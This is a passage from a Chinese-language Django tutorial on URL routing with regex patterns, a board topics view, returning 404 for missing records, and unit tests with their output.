class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^boards/(?P&lt;pk&gt;\d+)/$'</span>, views.board_topics, name=<span class="string">'board_topics'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>分析一下 <code>urlpatterns 和 url</code></p><p><strong>URL 调度器（dispatcher）</strong> 和 <strong>URLconf (URL configuration)</strong> 是 Django 应用中的基础部分。</p><p>Django开发团队正在致力于将路由语法简化（译注：就是将原来url函数替换成 path 函数，目前django2.0已经正式使用新的路由语法）</p><p>一个项目可以有很多 <strong>urls.py</strong> 分布在多个应用（app）中。Django 需要一个 <strong>url.py</strong> 作为入口。这个特殊的 <strong>urls.py</strong> 叫做<strong>根路由配置（root URLconf）</strong>。它被定义在 <strong>settings.py</strong> 中。</p><p><strong>myproject/settings.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROOT_URLCONF = <span class="string">'myproject.urls'</span></span><br></pre></td></tr></table></figure><p>它已经自动配置好了，你不需要去改变它任何东西。</p><p>当 Django 接受一个请求(request)， 它就会在项目的 URLconf 中寻找匹配项。他从 <code>urlpatterns</code> 变量的第一条开始，然后在每个 <code>url</code> 中去匹配请求的 URL。</p><p>如果 Django 找到了一个匹配路径，他会把请求(request)发送给 <code>url</code> 的第二个参数 <strong>视图函数（view function）</strong>。<code>urlpatterns</code> 中的顺序很重要，因为 Django 一旦找到匹配就会停止往后搜索。如果 Django 在 URLconf 中没有找到匹配项，他会通过 <strong>Page Not Found</strong> 的错误处理代码抛出一个 <strong>404</strong> 异常。</p><p>这是 <code>url</code>函数的剖析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(regex, view, kwargs=None, name=None)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>regex</strong>： 匹配 URL patterns 的正则表达式。注意：正则表达式会忽略掉 <strong>GET 或者 POST</strong> 后面的参数。在一个 <code>http://127.0.0.1:8000/boards/?page=2</code>的请求中，只有 /boards/ 会被处理。</p></li><li><p><strong>view</strong>： 视图函数被用来处理用户请求，同时它还可以是 <strong>django.conf.urls.include</strong> 函数的返回值，它将引用一个外部的<strong>urls.py</strong>文件，例如，你可以使用它来定义一组特定于应用的 URLs，使用前缀将其包含在根 URLconf 中。我们会在后面继续探讨这个概念。</p></li><li><p><strong>kwargs</strong>：传递给目标视图函数的任意关键字参数，它通常用于在可重用视图上进行一些简单的定制，我们不是经常使用它。</p></li><li><p><strong>name</strong>:： 该 URL 的唯一标识符。这是一个非常重要的特征。要始终记得为你的 URLs 命名。所以，很重要的一点是：不要在 views(视图) 或者 templates(模板) 中硬编码 URL，而是通过它的名字去引用 URL。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django01.png" alt=""></p><h3 id="基础-URLs-路由"><a href="#基础-URLs-路由" class="headerlink" title="基础 URLs 路由"></a>基础 URLs 路由</h3><p>基础URL创建起来很容易。就只是个匹配字符串的问题。比如说，我们想创建一个 “about” 页面，可以这样定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^about/$'</span>, views.about, name=<span class="string">'about'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们也可以创建更深层一点的 URL 结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^about/$'</span>, views.about, name=<span class="string">'about'</span>),</span><br><span class="line">    url(<span class="string">r'^about/company/$'</span>, views.about_company, name=<span class="string">'about_company'</span>),</span><br><span class="line">    url(<span class="string">r'^about/author/$'</span>, views.about_author, name=<span class="string">'about_author'</span>),</span><br><span class="line">    url(<span class="string">r'^about/author/vitor/$'</span>, views.about_vitor, name=<span class="string">'about_vitor'</span>),</span><br><span class="line">    url(<span class="string">r'^about/author/erica/$'</span>, views.about_erica, name=<span class="string">'about_erica'</span>),</span><br><span class="line">    url(<span class="string">r'^privacy/$'</span>, views.privacy_policy, name=<span class="string">'privacy_policy'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这是一些简单的 URL 路由的例子，对于上面所有的例子，视图函数都是下面这个结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># do something...</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'about.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about_company</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># do something else...</span></span><br><span class="line">    <span class="comment"># return some data along with the view...</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'about_company.html'</span>, &#123;<span class="string">'company_name'</span>: <span class="string">'Simple Complex'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="高级-URLs-路由"><a href="#高级-URLs-路由" class="headerlink" title="高级 URLs 路由"></a>高级 URLs 路由</h3><p>更高级的URL路由使用方法是通过正则表达式来匹配某些类型的数据并创建动态 URL</p><p>例如，要创建一个个人资料的页面，诸如 github.com/vitorfs or twitter.com/vitorfs(vitorfs 是我的用户名) 这样，我们可以像以下几点这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^(?P&lt;username&gt;[\w.@+-]+)/$'</span>, views.user_profile, name=<span class="string">'user_profile'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>它会匹配 Django 用户模型里面所有有效的用户名。</p><p>现在我们可以看到上面的例子是一个很宽松的 URL。这意味大量的 URL patterns 都会被它匹配，因为它定义在 URL 的根，而不像 <strong>/profile//</strong> 这样。在这种情况下，如果我们想定义一个 <strong>/about/</strong> 的URL，我们要把它定义在这个 username URL pattern 的前面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^about/$'</span>, views.about, name=<span class="string">'about'</span>),</span><br><span class="line">    url(<span class="string">r'^(?P&lt;username&gt;[\w.@+-]+)/$'</span>, views.user_profile, name=<span class="string">'user_profile'</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>如果这个 “about” 页面定义在usrename URL pattern 后面，Django 将永远找不到它，因为 “about” 这个单词会先被usrname的正则表达式所匹配到，视图函数<code>user_profile</code>将会被执行而不是执行 <code>about</code></p><p>此外，这有一些副作用。例如，从现在开始，我们要把 “about” 视为禁止使用的username，因为如果有用户将 “about” 作为他们的username，他们将永远不能看到他们的个人资料页面，而看到的about页面。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django02.png" alt=""></p><blockquote><p>如果你想给用户个人主页设置一个很酷的主页的URL，那么避免冲突最简单的方法是添加一个前缀，例如：/u/vitorfs，或者像 Medium 一样使用 @ 作为前缀 /@vitorfs/。</p></blockquote><p>这些 URL 路由的主要思想是当 URL 的一部分被当作某些资源(这些资源用来构成某个页面)的标识的时候就去创建一个动态页面。比如说，这个标识可以是一个整数的 ID 或者是一个字符串</p><p>开始的时候，我们使用 <strong>Board</strong> ID 去创建 <strong>Topics</strong>列表的动态页面。让我们再来看一下我在 <strong>URLs</strong> 开头的部分给出的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^boards/(?P&lt;pk&gt;\d+)/$'</span>, views.board_topics, name=<span class="string">'board_topics'</span>)</span><br></pre></td></tr></table></figure><p>正则表达式中的<code>\d+</code>会匹配一个任意大小的整数值。这个整数值用来从数据库中取到 指定的 <strong>Board</strong>。现在注意我们这样写这个正则表达式 <code>(?P&lt;pk&gt;\d+)</code>，这是告诉 Django 将捕获到的值放入名为 <strong>pk</strong> 的关键字参数中。</p><p>这时我们为它写的一个视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    <span class="comment"># do something ...</span></span><br></pre></td></tr></table></figure><p>因为我们使用了 <code>(?P&lt;pk&gt;\d+)</code> 正则表达式，在<code>board_topics</code>函数中，关键字参数必须命名为 <strong>pk</strong></p><p>如果你想在视图函数使用任意名字的参数，那么可以这样定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^boards/(\d+)/$'</span>, views.board_topics, name=<span class="string">'board_topics'</span>)</span><br></pre></td></tr></table></figure><p>然后在视图函数可以这样定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, board_id)</span>:</span></span><br><span class="line">    <span class="comment"># do something...</span></span><br></pre></td></tr></table></figure><p>或者这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, id)</span>:</span></span><br><span class="line">    <span class="comment"># do something...</span></span><br></pre></td></tr></table></figure><p>名字无关紧要，但是使用命名参数是一个很好的做法，因为，当我们有个更大的URL去捕获多个 ID 和变量时，这会更便于我们阅读</p><blockquote><p>PK or ID？<br><br>PK 表示主键（Primary key），这是访问模型的主键ID的简写方法，所有Django模型都有这个属性，更多的时候，使用pk属性和使用id是一样的，这是因为如果我们没有给model定义主键时，Django将自动创建一个 AutoField 类型的字段，名字叫做 id，它就是主键。<br>如果你给model定义了一个不同的主键，例如，假设 email 是你的主键，你就可以这样访问：obj.email 或者 obj.pk，二者是等价的。</p></blockquote><h3 id="使用-URLs-API"><a href="#使用-URLs-API" class="headerlink" title="使用 URLs API"></a>使用 URLs API</h3><p>我们来实现我在开头提到的主题列表页面</p><p>首先，编辑 <strong>urls.py</strong>， 添加新的 URL 路由</p><p><strong>myproject/urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^boards/(?P&lt;pk&gt;\d+)/$'</span>, views.board_topics, name=<span class="string">'board_topics'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>现在创建视图函数 <code>board_topics</code>：</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># code suppressed for brevity</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = Board.objects.get(pk=pk)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'topics.html'</span>, &#123;<span class="string">'board'</span>: board&#125;)</span><br></pre></td></tr></table></figure><p>在 <strong>templates</strong> 目录中，创建一个名为 <strong>topics.html</strong> 的模板：</p><p><strong>templates/topics.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：我们现在只是创建新的 HTML 模板。不用担心，在下一节中我会向你展示如何创建可重用模板。</p></blockquote><p>现在在浏览器中打开 URL <code>http://127.0.0.1:8000/boards/1/</code> ，结果应该是下面这个页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django03.png" alt=""></p><p>进行测试编写，编辑 <strong>test.py</strong>，在文件底部添加下面的测试：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> resolve</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> home, board_topics</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoardTopicsTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        Board.objects.create(name=<span class="string">'Django'</span>, description=<span class="string">'Django board.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_board_topics_view_success_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_board_topics_view_not_found_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">99</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_board_topics_url_resolves_board_topics_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        view = resolve(<span class="string">'/boards/1/'</span>)</span><br><span class="line">        self.assertEquals(view.func, board_topics)</span><br></pre></td></tr></table></figure><p>这里需要注意几件事情。这次我们使用了 <code>setUp</code>方法。在这个方法中，我们创建了一个 <strong>Board</strong> 实例来用于测试。我们必须这样做，因为 Django 的测试机制不会针对当前数据库跑你的测试。运行 Django 测试时会即时创建一个新的数据库，应用所有的model(模型)迁移 ，运行测试完成后会销毁这个用于测试的数据库。</p><p>因此在 <code>setUp</code> 方法中，我们准备了运行测试的环境，用来模拟场景。</p><ul><li><p><code>test_board_topics_view_success_status_code</code> 方法：测试 Django 是否对于现有的 Board 返回 status code(状态码) 200(成功)。</p></li><li><p><code>test_board_topics_view_not_found_status_code</code> 方法：测试 Django 是否对于不存在于数据库的 Board 返回 status code 404(页面未找到)。</p></li><li><p><code>test_board_topics_url_resolves_board_topics_view</code> 方法：测试 Django 是否使用了正确的视图函数去渲染 topics。</p></li></ul><p>现在来运行一下测试：</p><p><code>python manage.py test</code></p><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.E...</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ERROR: test_board_topics_view_not_found_status_code (boards.tests.BoardTopicsTests)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"># ...</span><br><span class="line">boards.models.DoesNotExist: Board matching query does not exist.</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 5 tests in 0.093s</span><br><span class="line"></span><br><span class="line">FAILED (errors&#x3D;1)</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>测试 <strong>test_board_topics_view_not_found_status_code</strong> 失败。我们可以在 Traceback 中看到返回了一个 exception(异常) “boards.models.DoesNotExist: Board matching query does not exist.”</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django04.png" alt=""></p><p>在 <code>DEBUG=False</code> 的生产环境中，访问者会看到一个 <strong>500 Internal Server Error</strong> 的页面。但是这不是我们希望得到的。</p><p>想要一个 <strong>404 Page Not Found</strong> 的页面。让我们来重写我们的视图函数。</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># code suppressed for brevity</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        board = Board.objects.get(pk=pk)</span><br><span class="line">    <span class="keyword">except</span> Board.DoesNotExist:</span><br><span class="line">        <span class="keyword">raise</span> Http404</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'topics.html'</span>, &#123;<span class="string">'board'</span>: board&#125;)</span><br></pre></td></tr></table></figure><p>重新测试一下：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.....</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 5 tests in 0.021s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>访问浏览器，它将按照预期工作：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django05.png" alt=""></p><p>这是 Django 在 <code>DEBUG=False</code> 的情况下显示的默认页面。稍后，我们可以自定义 404 页面去显示一些其他的东西。</p><p>这是一个常见的用法。事实上， Django 有一个快捷方式去得到一个对象，或者返回一个不存在的对象 404。</p><p>因此让我们再来重写一下 <strong>board_topics</strong> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, get_object_or_404</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># code suppressed for brevity</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">board_topics</span><span class="params">(request, pk)</span>:</span></span><br><span class="line">    board = get_object_or_404(Board, pk=pk)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'topics.html'</span>, &#123;<span class="string">'board'</span>: board&#125;)</span><br></pre></td></tr></table></figure><p>修改了代码，测试一下。</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.....</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 5 tests in 0.043s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>没有破坏任何东西。我们可以继续我们的开发。</p><p>下一步是在屏幕上创建一个导航链接。主页应该有一个链接指引访问者去访问指定板块下面的主题列表页面。同样地，topics 页面也应当有一个返回主页的链接。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django06.png" alt=""></p><p>我们可以先为 <code>HomeTests</code> 类编写一些测试：</p><p><strong>boards/test.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.board = Board.objects.create(name=<span class="string">'Django'</span>, description=<span class="string">'Django board.'</span>)</span><br><span class="line">        url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        self.response = self.client.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.assertEquals(self.response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_url_resolves_home_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        view = resolve(<span class="string">'/'</span>)</span><br><span class="line">        